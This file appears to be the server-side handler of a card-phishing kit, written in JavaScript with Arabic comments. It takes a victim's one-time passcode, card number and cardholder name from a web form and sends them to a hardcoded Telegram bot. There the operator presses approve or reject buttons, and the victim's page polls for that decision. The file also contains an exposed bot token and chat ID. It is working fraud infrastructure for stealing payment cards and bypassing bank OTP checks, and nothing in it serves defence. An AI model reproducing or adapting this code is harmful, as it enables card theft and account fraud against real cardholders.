global.otpStatuses = global.otpStatuses || {};

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();

  const BOT_TOKEN = "8704506100:AAG1IvxmDba-3v90ujm2ZCc765EROT0T8Qc";
  const CHAT_ID = "8040433133";
  const method = req.method;
  const body = req.body || {};

  // 1. إذا طلب المتصفح فحص الحالة
  if (method === 'GET') {
    const { user_id } = req.query;
    if (!user_id) return res.status(200).json({ status: 'pending' });
    const status = global.otpStatuses[user_id] || 'pending';
    return res.status(200).json({ status });
  }

  // 2. إذا ضغطت أنت على زر موافقة أو رفض في تليجرام
  if (body.callback_query) {
    const callback = body.callback_query;
    const callbackData = callback.data;
    const chatId = callback.message.chat.id;
    const messageId = callback.message.message_id;

    if (callbackData.startsWith('approve_otp_')) {
      const userId = callbackData.replace('approve_otp_', '');
      global.otpStatuses[userId] = 'approved'; // حفظ الموافقة فوراً

      // تعديل رسالة تليجرام لإزالة الأزرار وإعلامك
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          message_id: messageId,
          text: callback.message.text + "\n\n✅ **[تمت الموافقة وتم نقل العميل بنجاح]**",
          parse_mode: 'Markdown'
        })
      });
    } else if (callbackData.startsWith('reject_otp_')) {
      const userId = callbackData.replace('reject_otp_', '');
      global.otpStatuses[userId] = 'rejected';
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: "تمت الموافقة بنجاح!" })
    });

    return res.status(200).json({ ok: true });
  }

  // 3. إرسال كود الـ OTP للبوت مع أزرار الموافقة والرفض
  if (body.رمز_التحقق_OTP) {
    const text = `🔐 *طلب رمز تحقق (OTP) جديد*\n\n` +
                 `🔑 الكود: \`${body.رمز_التحقق_OTP}\`\n` +
                 `💳 البطاقة: \`${body.رقم_البطاقة || 'غير متوفر'}\`\n` +
                 `👤 الاسم: ${body.اسم_الحامل || 'غير متوفر'}\n` +
                 `🆔 معرف المستخدم: \`${body.user_id}\``;

    const keyboard = {
      inline_keyboard: [
        [
          { text: "✅ موافقة", callback_data: `approve_otp_${body.user_id}` },
          { text: "❌ رفض", callback_data: `reject_otp_${body.user_id}` }
        ]
      ]
    };

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'Markdown',
          reply_markup: keyboard
        })
      });
      return res.status(200).json({ ok: true });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  return res.status(200).json({ ok: true });
}
